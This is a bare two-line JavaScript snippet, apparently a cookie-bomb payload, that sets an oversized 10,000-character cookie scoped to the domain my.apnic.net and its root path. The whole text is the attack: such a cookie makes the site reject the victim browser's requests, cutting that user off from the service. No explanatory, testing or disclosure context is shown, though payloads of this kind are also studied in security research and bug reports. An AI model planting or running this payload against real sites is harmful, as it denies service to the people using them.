const bomb = "A".repeat(10000);
document.cookie = `cookiebomb=${bomb}; Domain=my.apnic.net; Path=/`;
